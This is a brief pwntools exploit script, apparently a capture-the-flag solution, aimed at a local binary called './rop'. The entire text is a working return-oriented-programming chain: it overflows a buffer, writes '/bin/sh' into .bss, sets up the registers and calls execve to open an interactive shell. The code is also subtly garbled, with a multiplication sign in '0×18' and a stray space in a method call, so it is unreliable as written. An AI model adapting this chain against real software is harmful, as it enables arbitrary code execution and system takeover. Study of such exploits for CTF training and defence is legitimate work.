from pwn import*

r=process('./rop')
raw_input()

pop_rdi=0x0000000000400686# pop rdi; ret
pop_rsi=0x0000000000410093# pop rsi; ret
pop_rdx=0x00000000004494b5# pop rdx; ret
pop_rax=0x0000000000415294# pop rax; ret
mov_qword_rdi_rsi=0x0000000000446c1b # mov qword ptr [rdi], rsi; ret
syscall=0x0000000000474a65# syscall; ret
bss =0x00000000006bb2e0

r. recvuntil('\n')
p='a'*0×18
p+=p64(pop_rdi)
p+=p64(bss)
p+=p64(pop_rsi)
p+='/bin/sh\x00'
p+=p64(mov_qword_rdi_rsi)

p+=p64(pop_rsi)
p+=p64(0)

p+=p64(pop_rdx)
p+=p64(0)

p+=p64(pop_rax)
p+=p64(0x3b)

p+=p64(syscall)

r.send(p)

r.interactive()
